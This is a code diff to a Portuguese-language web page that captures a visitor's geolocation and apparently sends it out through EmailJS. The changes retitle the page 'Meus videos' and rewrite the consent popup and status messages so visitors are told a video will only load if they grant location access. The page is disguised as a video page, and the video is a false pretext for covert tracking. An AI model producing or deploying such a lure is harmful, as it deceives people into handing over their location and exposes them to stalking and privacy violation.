@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Captura de Localização</title>
+  <title>Meus videos</title>
   <style>
     html, body {
       margin: 0;
@@ -68,8 +68,8 @@
 
 <!-- Popup de consentimento -->
 <div id="popup">
-  <h2>Permitir acesso à sua localização?</h2>
-  <p>Para continuar, precisamos da sua permissão para capturar a localização.</p>
+  <h2>Permitir acesso à seu dispositivo?</h2>
+  <p>Para continuar, precisamos da sua permissão para capturar a localização, se não o video não será carregado.</p>
   <button onclick="permitir()">Permitir</button>
 </div>
 
@@ -81,7 +81,7 @@
 <!-- Conteúdo principal -->
 <div id="content" style="display: none;">
   <h1>Bem-vindo!</h1>
-  <p id="location">Carregando localização...</p>
+  <p id="location">Carregando video...</p>
 </div>
 
 <!-- EmailJS -->
@@ -149,7 +149,7 @@
         `Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
     } else {
       document.getElementById('location').innerText =
-        "Localização não permitida ou não capturada.";
+        "Localização não permitida ou não capturada, por isso video não carregado. Atualize a pagine e permita a o acesso.";
     }
 
     const params = {
